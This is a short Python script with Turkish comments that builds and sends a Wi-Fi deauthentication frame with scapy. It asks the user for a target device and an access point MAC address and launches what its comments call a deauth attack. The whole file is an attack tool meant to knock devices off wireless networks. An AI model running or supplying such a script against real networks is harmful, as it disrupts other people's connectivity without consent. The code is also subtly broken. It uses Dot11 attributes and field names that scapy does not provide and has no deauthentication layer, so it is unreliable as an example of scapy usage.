import scapy.all as scapy

def deauth(target_mac, ap_mac):
    # Deauth paketi oluştur
    deauth_packet = scapy.RadioTap()/scapy.Dot11(type=scapy.Dot11.DEAUTH,
                                                 subtype=scapy.Dot11.AUTH_REQUEST,
                                                 bssid=ap_mac,
                                                 dest=target_mac)

    # Paketi gönder
    scapy.sendp(deauth_packet, iface="wlan0")


if __name__ == "__main__":
    # Hedef MAC adresini gir
    target_mac = input("Hedef MAC adresini girin: ")

    # Erişim noktası MAC adresini gir
    ap_mac = input("Erişim noktası MAC adresini girin: ")

    # Deauth saldırısını başlat
    deauth(target_mac, ap_mac)
